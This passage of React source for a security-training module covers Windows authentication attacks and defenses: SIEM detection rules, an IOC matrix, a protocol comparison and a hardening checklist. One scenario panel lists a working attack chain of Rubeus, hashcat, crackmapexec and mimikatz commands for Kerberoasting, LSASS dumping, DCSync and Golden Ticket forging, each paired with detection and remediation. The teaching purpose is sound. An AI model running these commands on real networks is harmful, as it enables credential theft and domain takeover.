                    <span style={{ ...S.badge(c), minWidth: "38px", textAlign: "center", flexShrink: 0 }}>{id}</span>
                    <span style={{ color: C.dim, fontSize: "11px" }}>{desc}</span>
                  </div>
                ))}
              </div>
            </div>
          )}

          {monTab === "siem" && (
            <div>
              <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ SIEM DETECTION RULES — AUTHENTICATION ATTACKS</div>
              <div style={S.code}>
{`── KERBEROASTING DETECTION ──`}
{`Event: 4769 (Service Ticket Request)`}
{`Filter: TicketEncryptionType = 0x17 (RC4)`}
{`AND:    ServiceName != "krbtgt"`}
{`AND:    ServiceName != ends with "$"  (exclude computers)`}
{`Threshold: >5 unique SPNs from single account in 1 minute`}
{`Alert: HIGH — Kerberoasting in progress`}
{``}
{`── AS-REP ROASTING DETECTION ──`}
{`Event: 4768 (AS-REQ / TGT Request)`}
{`Filter: PreAuthType = 0  (no pre-authentication)`}
{`Alert: CRITICAL — account has pre-auth disabled`}
{``}
{`── PASS-THE-HASH DETECTION ──`}
{`Event: 4624 (Logon)`}
{`Filter: LogonType = 9 (NewCredentials)`}
{`AND:    AuthenticationPackageName = NTLM`}
{`AND:    Source IP != localhost`}
{`Threshold: >3 different destinations within 5 min`}
{`Alert: HIGH — potential lateral movement via PtH`}
{``}
{`── DCSYNC DETECTION ──`}
{`Event: 4662 (AD Object Operation)`}
{`Filter: ObjectType = domainDNS`}
{`AND:    Properties CONTAINS "1131f6aa-..." (DS-Replication-Get-Changes-All)`}
{`AND:    SubjectUserName NOT IN [DC computer accounts]`}
{`Alert: CRITICAL — DCSync from non-DC account`}
{``}
{`── GOLDEN TICKET DETECTION ──`}
{`Event: 4769 (TGS-REQ)`}
{`Filter: TicketOptions includes RENEWABLE`}
{`AND:    TicketLifetime > 10 hours`}
{`OR:     UserID in PAC != AD user SID`}
{`Alert: CRITICAL — possible Golden Ticket`}
              </div>
            </div>
          )}

          {monTab === "tools" && (
            <div style={S.grid2}>
              {[
                ["BloodHound / SharpHound", "bloodhound-python / SharpHound.exe", "AD attack path mapping. Visualizes privilege escalation paths. Identifies Kerberoastable accounts, DCSync rights, delegation misconfigs. Used by both red and blue teams.", C.cyan],
                ["Rubeus", "Rubeus.exe kerberoast/dump/ptt", "Pure C# Kerberos toolkit. Kerberoasting, AS-REP Roasting, ticket extraction/injection, S4U delegation abuse. Highly relevant for both offense and detection tuning.", C.orange],
                ["Impacket Suite", "secretsdump.py / GetUserSPNs.py", "Python toolkit: DCSync (secretsdump), Kerberoasting (GetUserSPNs), NTLM relay (ntlmrelayx), pass-the-hash (smbclient). Standard red team toolkit.", C.red],
                ["Microsoft LAPS", "LAPS.exe / GPO deployment", "Local Administrator Password Solution. Randomizes local admin passwords per machine. Prevents lateral movement via shared local admin hash. Deploy on all endpoints.", C.green],
                ["PingCastle", "PingCastle.exe --healthcheck", "AD security assessment. Identifies: delegation misconfig, weak Kerberos encryption, stale accounts, dangerous rights, trust issues. Blue team health check.", C.purple],
                ["Mimikatz (understanding)", "sekurlsa / kerberos / lsadump", "The reference tool for credential attacks. Understanding its capabilities is essential for defenders to detect and block equivalent techniques in real attacks.", C.pink],
              ].map(([t, cmd, d, c]) => (
                <div key={t} style={{ background: "#08090d", border: `1px solid ${c}22`, borderRadius: "4px", padding: "10px" }}>
                  <div style={{ color: c, fontWeight: "700", fontSize: "11px" }}>{t}</div>
                  <div style={{ color: C.dim, fontSize: "10px", fontStyle: "italic", marginBottom: "4px" }}>{cmd}</div>
                  <div style={{ color: C.text, fontSize: "11px" }}>{d}</div>
                </div>
              ))}
            </div>
          )}

          {monTab === "iocs" && (
            <div>
              <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ AUTHENTICATION ATTACK IOC MATRIX</div>
              <div style={S.grid2}>
                {[
                  ["Event 4769 with RC4 encryption (0x17)", "Kerberoasting in progress. Alert on RC4 TGS for user service accounts (not computer accounts).", C.red],
                  ["Event 4768 with PreAuthType=0", "AS-REP Roastable account being targeted OR account has misconfigured pre-auth disabled.", C.red],
                  ["Event 4662 from workstation source IP", "DCSync attack. Only DCs should generate replication events. Non-DC source = attacker.", C.red],
                  ["Burst of 4769 from one account in seconds", "Automated Kerberoasting tool running (Rubeus, Invoke-Kerberoast). Alert on >10 unique SPNs/minute.", C.orange],
                  ["4624 Type 3 from unexpected source", "NTLM or Kerberos network logon from non-admin workstation to sensitive server. Lateral movement indicator.", C.orange],
                  ["Ticket lifetime > policy max (10 hours)", "Golden Ticket usually forged with longer lifetime. Alert on TGS requests for tickets with lifetime > org standard.", C.red],
                  ["LSASS access Event 10 (Sysmon)", "OpenProcess on lsass.exe with PROCESS_VM_READ access mask from non-security tool. Credential dump attempt.", C.red],
                  ["Event 4776 from non-domain machine", "NTLM auth against DC from machine not in domain or from unexpected network segment = anomaly.", C.orange],
                ].map(([t, d, c]) => (
                  <div key={t} style={{ background: "#08090d", border: `1px solid ${c}22`, borderRadius: "4px", padding: "9px", marginBottom: "7px" }}>
                    <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "3px" }}>▸ {t}</div>
                    <div style={{ color: C.dim, fontSize: "10.5px" }}>{d}</div>
                  </div>
                ))}
              </div>
            </div>
          )}
        </PB>

        {/* ── 10: Comparison ── */}
        <PB title="NTLM vs KERBEROS vs MODERN AUTH — PROTOCOL COMPARISON" icon="🔑" color={C.cyan}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {["protocols","crypto","weaknesses","enterprise"].map(t => (
              <button key={t} style={S.tab(cmpTab === t, C.cyan)} onClick={() => setCmpTab(t)}>{t.toUpperCase()}</button>
            ))}
          </div>
          <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: "14px" }}>
            {[
              { title: "NTLM", color: C.orange, data: {
                protocols: [["Type","Challenge-Response"],["Standard","Microsoft proprietary"],["Year","1993 (LM) / 1996 (NTLMv2)"],["Versions","LM → NTLMv1 → NTLMv2 (current)"],["Mutual auth","❌ Server not authenticated"],["Replay","Prevented in NTLMv2 only (client nonce)"]],
                crypto: [["Hash","MD4(UTF-16LE(password))"],["Challenge","8-byte server nonce"],["Response","HMAC-MD5 of challenge+client nonce"],["Session key","MD5-based"],["Strength","Weak — no salt, dictionary-crackable"]],
                weaknesses: [["Pass-the-Hash","Hash = password equivalent"],["Relay","No channel binding by default"],["Crack","RC4/MD4 → GPU crackable"],["No MFA","Protocol has no MFA support"],["Monitoring","Hard to distinguish legit vs PtH"]],
                enterprise: [["Use case","Local auth, legacy, workgroup"],["DC required","No (local SAM)"],["SSO","Limited (no cross-domain)"],["Fallback","When Kerberos fails"],["Disable","Target: restrict NTLM to zero"]],
              }},
              { title: "KERBEROS v5", color: C.yellow, data: {
                protocols: [["Type","Ticket-based SSO"],["Standard","RFC 4120 (open standard)"],["Year","1993 (MIT), AD since Win2000"],["Mutual auth","✓ Both parties authenticated"],["Replay","Client nonce in authenticator prevents replay"],["Delegation","S4U2Self/S4U2Proxy constrained"]],
                crypto: [["TGT key","KRBTGT AES256 key"],["Service ticket","Service account AES/RC4"],["Session key","AES256 (if configured)"],["Pre-auth","Encrypted timestamp with user key"],["Strength","Strong — AES256 + mutual auth"]],
                weaknesses: [["Kerberoast","RC4 service tickets crackable"],["Golden Ticket","KRBTGT hash = permanent access"],["AS-REP","Pre-auth disabled = offline crack"],["Silver Ticket","Service key = forge service ticket"],["PAC forgery","MS14-068 (patched)"]],
                enterprise: [["Use case","Domain auth, SSO, service access"],["DC required","Yes (AS/TGS exchange)"],["SSO","Full AD forest SSO"],["Fallback","Falls back to NTLM"],["Target","AES256 everywhere, rotate KRBTGT"]],
              }},
              { title: "Modern Auth", color: C.green, data: {
                protocols: [["Type","OAuth 2.0 / OIDC / FIDO2"],["Standard","Open standards (RFC 6749+)"],["Year","2012+ (OAuth2), 2018+ (FIDO2)"],["Mutual auth","✓ Certificate/key-based"],["MFA","Native MFA support"],["Phishing","FIDO2 = phishing-resistant"]],
                crypto: [["User auth","Asymmetric (public key pair)"],["Token","JWT signed with RS256/ES256"],["TLS","Required for all exchanges"],["Key storage","TPM / Secure Enclave"],["Strength","Strongest — no password transmitted"]],
                weaknesses: [["Token theft","Access token stolen = impersonation"],["Consent phishing","Malicious OAuth app grant"],["Refresh token","Long-lived refresh token theft"],["Device trust","Requires device management"],["Legacy apps","Cannot use — NTLM/Kerberos needed"]],
                enterprise: [["Use case","Azure AD, M365, cloud services"],["DC required","No (cloud Identity Provider)"],["SSO","Full cloud + hybrid SSO"],["Target","Migrate all to OIDC/FIDO2"],["MFA","Mandatory for all accounts"]],
              }},
            ].map(({ title, color, data }) => (
              <div key={title} style={{ background: "#0a0a10", border: `1px solid ${color}33`, borderRadius: "4px", padding: "12px" }}>
                <div style={{ color, fontWeight: "700", fontSize: "12px", marginBottom: "10px" }}>
                  {title === "NTLM" ? "⚠" : title === "KERBEROS v5" ? "🎟" : "🛡"} {title}
                </div>
                {(data[cmpTab] || []).map(([k, v]) => (
                  <div key={k} style={{ display: "flex", gap: "8px", marginBottom: "5px" }}>
                    <span style={{ color: C.dim, minWidth: "90px", fontSize: "10.5px" }}>{k}</span>
                    <span style={{ color: C.bright, fontSize: "10.5px" }}>{v}</span>
                  </div>
                ))}
              </div>
            ))}
          </div>
        </PB>

        {/* ── 11: Enterprise Scenario ── */}
        <PB title="ENTERPRISE SCENARIO — KERBEROASTING → LATERAL MOVEMENT → DCSync" icon="⚠" color={C.orange} accent={C.orange + "44"}>
          <div style={{ color: C.red, fontWeight: "700", marginBottom: "12px", fontSize: "12px" }}>
            🔥 SCENARIO: APT Kerberoasts Service Account → Cracks Hash → DCSync → Golden Ticket → Persistence
          </div>
          <div style={S.grid2}>
            <div>
              <div style={{ color: C.orange, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ FULL ATTACK CHAIN</div>
              <div style={S.code}>
{`# Day 1: Initial access (phishing → domain user)`}
{`# Low-privilege user: jsmith@corp.local`}
{``}
{`# Day 1: Kerberoast (no elevated privs needed)`}
{`Rubeus.exe kerberoast /outfile:hashes.txt`}
{`# → svc_sql (MSSQLSvc/sqlsrv:1433) hash extracted`}
{`# → hashcat -m 13100 hashes.txt rockyou.txt`}
{`# → 'P@ssw0rd2020' cracked in 2 hours`}
{``}
{`# Day 2: Lateral movement as svc_sql`}
{`# svc_sql has local admin on DB servers`}
{`crackmapexec smb 10.0.1.0/24 -u svc_sql -p 'P@ssw0rd2020'`}
{`# → PWNED: db01, db02, db03`}
{``}
{`# Day 2: LSASS dump on DB server → DA hash found`}
{`mimikatz sekurlsa::logonpasswords`}
{`# → Domain Admin hash cached from recent logon!`}
{``}
{`# Day 3: DCSync → KRBTGT hash`}
{`mimikatz lsadump::dcsync /domain:corp.local /user:krbtgt`}
{`# → krbtgt NT hash: 8846f7eaee8fb...`}
{``}
{`# Day 3: Golden Ticket → eternal access`}
{`mimikatz kerberos::golden /user:Administrator`}
{`    /domain:corp.local /sid:S-1-5-21-..`}
{`    /krbtgt:8846f7eaee8fb... /ticket:golden.kirbi`}
{`# Valid for 10 years. Survives user password resets.`}
              </div>
            </div>
            <div>
              <div style={{ color: C.green, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ DETECTION OPPORTUNITIES + RESPONSE</div>
              <div style={S.code}>
{`# Day 1 — Kerberoast alert:`}
{`# Event 4769: Encryption=RC4(0x17) for svc_sql SPN`}
{`# SIEM: RC4 TGS for svc_sql → INVESTIGATE`}
{``}
{`# Day 2 — Lateral movement alert:`}
{`# Event 4624 Type 3: svc_sql → db01 (unusual)`}
{`# LSASS Sysmon Event 10 on db01`}
{``}
{`# Day 3 — DCSync alert (CRITICAL):`}
{`# Event 4662: DS-Replication GUID from db01`}
{`# db01 is NOT a domain controller!`}
{`# → IMMEDIATE incident response`}
{``}
{`# Golden Ticket detection:`}
{`# Event 4769 with ticket lifetime > 10 hours`}
{`# Verify with: klist → Renew Until timestamp`}
{``}
{`# Remediation:`}
{`# 1. Isolate all compromised hosts immediately`}
{`# 2. Reset KRBTGT password TWICE (24h apart)`}
{`# 3. Reset all DA/service account passwords`}
{`# 4. Revoke all active Kerberos tickets (krbtgt reset)`}
{`# 5. Hunt for Golden Ticket usage in Event 4769`}
{`# 6. Deploy gMSA for svc_sql going forward`}
{`# 7. Enable AES-only Kerberos for service accounts`}
              </div>
            </div>
          </div>
          <hr style={S.sep} />
          <div style={S.grid3}>
            {[
              ["Root Cause", "Weak service account password + RC4 Kerberos + cached DA creds on DB server + no DCSync rights audit", C.orange],
              ["KRBTGT Reset Critical", "KRBTGT reset invalidates ALL existing Kerberos tickets including Golden Tickets. Reset twice — first reset invalidates old tickets, second reset ensures no old key cached.", C.yellow],
              ["Prevention Stack", "gMSA (no crackable password) + AES Kerberos + Tiering Model (no DA on workstations) + DCSync rights audit + Kerberoast monitoring", C.green],
            ].map(([t, d, c]) => (
              <div key={t} style={{ background: "#09090d", border: `1px solid ${c}33`, borderRadius: "4px", padding: "10px" }}>
                <div style={{ color: c, fontWeight: "700", fontSize: "11px", marginBottom: "4px" }}>▸ {t}</div>
                <div style={{ color: C.dim, fontSize: "11px" }}>{d}</div>
              </div>
            ))}
          </div>
        </PB>

        {/* ── 12: Checklist + Summary ── */}
        <PB title="AUDITOR CHECKLIST + SUMMARY" icon="✓" color={C.green}>
          <div style={S.grid2}>
            {[
              [C.green, "NTLM & Basic Auth Hardening", [
                "LmCompatibilityLevel = 5 (NTLMv2 only, refuse LM/NTLMv1)",
                "WDigest UseLogonCredential = 0 (no plaintext in LSASS)",
                "SMB Signing required on all systems (prevents NTLM relay)",
                "NTLM audit enabled — 30 days before blocking to baseline",
                "Anonymous SID/Name enumeration disabled (RestrictAnonymous=1)",
              ]],
              [C.cyan, "Kerberos & Active Directory", [
                "No accounts with DoesNotRequirePreAuth set (AS-REP Roasting prevention)",
                "All service accounts use gMSA or >25-char random passwords",
                "msDS-SupportedEncryptionTypes = 24 (AES128+256 only) for service accounts",
                "DCSync rights audit: no non-DC accounts with DS-Replication-Get-Changes-All",
                "Unconstrained delegation disabled on all non-DC accounts",
                "KRBTGT password rotation procedure documented and tested",
              ]],
              [C.orange, "LSASS & Credential Protection", [
                "LSASS RunAsPPL = 1 (verify with Process Explorer — pink shield)",
                "Credential Guard active (Win32_DeviceGuard SecurityServicesRunning includes 1)",
                "ASR rule for LSASS protection enabled (not audit mode)",
                "Cached logon count = 0 on servers, ≤2 on workstations",
                "No cleartext passwords in Group Policy Preferences (GPP)",
              ]],
              [C.purple, "Monitoring Coverage", [
                "Event 4769 + RC4 encryption type (0x17) → SIEM alert for Kerberoasting",
                "Event 4768 + PreAuthType=0 → alert for AS-REP Roasting",
                "Event 4662 from non-DC source → CRITICAL DCSync alert",
                "Sysmon Event 10 on lsass.exe → CRITICAL LSASS access alert",
                "Baseline: expected Kerberos ticket request volume per account per hour",
              ]],
            ].map(([c, title, items]) => (
              <div key={title} style={{ background: "#09090d", border: `1px solid ${c}22`, borderRadius: "4px", padding: "12px" }}>
                <div style={{ color: c, fontWeight: "700", fontSize: "11px", marginBottom: "8px" }}>▸ {title}</div>
                {items.map(item => (
                  <div key={item} style={{ display: "flex", gap: "6px", marginBottom: "5px" }}>
                    <span style={{ color: C.dim, fontSize: "11px" }}>☐</span>
                    <span style={{ color: C.dim, fontSize: "11px" }}>{item}</span>
                  </div>
                ))}
              </div>
            ))}
          </div>
          <hr style={S.sep} />
          <div style={S.grid3}>
            {[
              ["KRBTGT = domain's master secret", "Every TGT is signed with KRBTGT key. Compromise it → forge eternal tickets for any account. Reset TWICE after any DC compromise.", C.yellow],
              ["NTLM hash = password — treat it so", "MD4(password) with no salt. Holding the hash = holding the password for NTLM auth. PPL + Credential Guard are the mandatory defenses.", C.red],
              ["Kerberoasting = any-user attack", "Any domain account can request TGS for any SPN. Weak service account password = domain compromise. gMSA + AES = prevention.", C.orange],
            ].map(([t, d, c]) => (
              <div key={t} style={{ background: "#09090d", border: `1px solid ${c}22`, borderRadius: "4px", padding: "12px" }}>
                <div style={{ color: c, fontWeight: "700", fontSize: "11px", marginBottom: "5px" }}>▸ {t}</div>
                <div style={{ color: C.dim, fontSize: "11px" }}>{d}</div>
              </div>
            ))}
          </div>
          <hr style={S.sep} />
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: "10px" }}>
            <div style={{ color: C.dim, fontSize: "11px" }}>
              <span style={{ color: C.green }}>NEXT MODULE →</span> Step 08: Active Directory — Architecture, Trusts, Group Policy, AD Attack Paths & Hardening
            </div>
            <div style={{ display: "flex", gap: "8px" }}>
              <Pill c={C.green}>Step 07 Complete</Pill>
              <Pill c={C.blue}>12 Panels · Authentication Mastered</Pill>
            </div>
          </div>
        </PB>

      </div>
    </div>
  );
}
